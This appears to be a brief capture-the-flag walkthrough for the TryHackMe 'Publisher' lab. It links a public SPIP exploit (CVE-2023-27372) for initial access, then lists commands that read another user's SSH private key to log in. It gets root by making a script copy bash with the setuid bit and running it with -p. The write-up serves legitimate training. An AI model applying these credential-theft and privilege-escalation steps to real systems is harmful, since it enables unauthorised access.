
# Publisher
https://tryhackme.com/room/publisher

## solution
### foothold
exploit an SPIP vulnerability - https://github.com/nuts7/CVE-2023-27372

### user
```sh
cat /home/think/.ssh/id_rsa
```
```sh
echo '<privatekey>' > id_rsa
chmod 600 id_rsa
ssh-keygen -y -f think_id_rsa > think_id_rsa.pub
ssh -i id_rsa think@ip
cat /home/think/user.txt
```

### root
```sh
cd /dev/shm
cp /bin/bash .
./bash -p
```

/opt/run_container.sh
```
#!/bin/bash

cp /bin/bash /tmp/default
chmod +s /tmp/default
```

```
./tmp/default -p
cat /root/root.txt
```
